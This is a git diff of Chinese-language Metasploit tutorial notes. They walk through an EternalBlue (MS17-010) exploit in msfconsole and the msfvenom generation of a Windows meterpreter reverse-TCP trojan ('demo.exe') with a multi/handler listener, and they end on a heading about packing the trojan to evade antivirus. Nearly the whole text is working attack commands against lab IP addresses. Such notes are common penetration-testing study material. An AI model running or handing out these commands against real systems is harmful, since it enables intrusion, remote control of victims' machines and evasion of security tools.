@@ -2,6 +2,8 @@
 
 https://www.metasploit.com/
 
+> 简称MSF
+
 kali中打开终端 & 输入 `msfconsole`
 
 ![](./images/02-Metasploit-1706774645060.png)
@@ -15,7 +17,7 @@ metasploit通过永恒之蓝病毒漏洞攻击流程
 ```shell
 msfconsole
 
-# 搜索
+# 搜索漏洞，微软安全公告：https://learn.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010
 search ms17
 
 # 使用模块
@@ -26,7 +28,7 @@ show options
 
 # 设置必选项 
 # RHOSTS：攻击谁
-set RHOSTS 172.18.48.xxx
+set RHOSTS 172.16.20.xx
 # LPORT：在kali上开启的端口（1-65535），注意不要被占用
 set LPORT 10001
 
@@ -40,19 +42,19 @@ run
 
 ```shell
 # 1、生成远控木马   msfvenom -p [payload] LHOST=[IP地址] LPORT=[端口号] -f [格式] -o [文件名]
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.18.48.236 LPORT=10000 -f exe -o demo.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.137.194 LPORT=10000 -f exe -o demo.exe
 
 # 2、主控端 -- 开启监听
 msfconsole
 use exploit/multi/handler
 show options
 set payload windows/x64/meterpreter_reverse_tcp
-set LHOST 172.18.48.236
+set LHOST 192.168.137.194
 set LPORT 10000
 # 等待目标靶机上线
 run
 
-# 3、等待对方触发上面生成的木马文件 demo.exe
+# 3、等待目标靶机触发上面生成的木马文件 demo.exe
 ```
 
 #### 加壳免杀
